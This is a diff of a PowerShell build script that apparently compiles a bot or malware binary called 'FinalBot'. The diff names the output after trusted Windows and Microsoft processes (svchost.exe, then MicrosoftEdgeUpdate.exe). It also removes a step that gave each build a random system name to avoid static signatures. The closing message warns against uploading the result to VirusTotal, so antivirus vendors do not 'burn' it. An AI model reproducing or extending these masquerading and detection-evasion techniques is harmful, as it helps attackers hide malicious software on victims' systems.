@@ -23,23 +23,15 @@ if ($LASTEXITCODE -ne 0) {
     exit 1
 }
 
-$Source = Join-Path $OutputDir "svchost.exe"
+$Source = Join-Path $OutputDir "MicrosoftEdgeUpdate.exe"
 if (!(Test-Path $Source)) {
-    Write-Host "[!] FinalBot.exe not found in $OutputDir" -ForegroundColor Red
+    Write-Host "[!] svchost.exe not found in $OutputDir" -ForegroundColor Red
     exit 1
 }
 
-# Pick a random system name each build — no static signature
-$ChosenName = $SystemNames[(Get-Random -Maximum $SystemNames.Length)]
-$Dest = Join-Path $OutputDir $ChosenName
-
-Copy-Item $Source $Dest -Force
-Remove-Item $Source -Force
-
 Write-Host ""
 Write-Host "[+] Build SUCCESSFUL" -ForegroundColor Green
-Write-Host "[+] Output : $Dest" -ForegroundColor Green
-Write-Host "[+] Name   : $ChosenName" -ForegroundColor Yellow
-Write-Host "[+] Size   : $([math]::Round((Get-Item $Dest).Length / 1MB, 1)) MB" -ForegroundColor White
+Write-Host "[+] Output : $Source" -ForegroundColor Green
+Write-Host "[+] Size   : $([math]::Round((Get-Item $Source).Length / 1MB, 1)) MB" -ForegroundColor White
 Write-Host ""
 Write-Host "[!] DO NOT upload to VirusTotal (burn rate)." -ForegroundColor DarkYellow
